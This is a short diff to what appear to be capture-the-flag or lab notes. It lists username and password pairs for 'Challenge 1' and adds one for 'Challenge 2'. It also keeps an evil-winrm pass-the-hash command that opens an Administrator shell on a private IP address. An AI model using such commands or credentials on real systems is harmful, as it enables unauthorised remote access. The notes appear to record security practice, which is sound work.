@@ -228,3 +228,5 @@ Challenge 1
 	Nathan:abc123//
 	Allison:RockYou!
 	evil-winrm -u Administrator -H 8c802621d2e36fc074345dded890f3e5 -i 192.168.130.57
+Challenge 2
+	adam:fiosadf
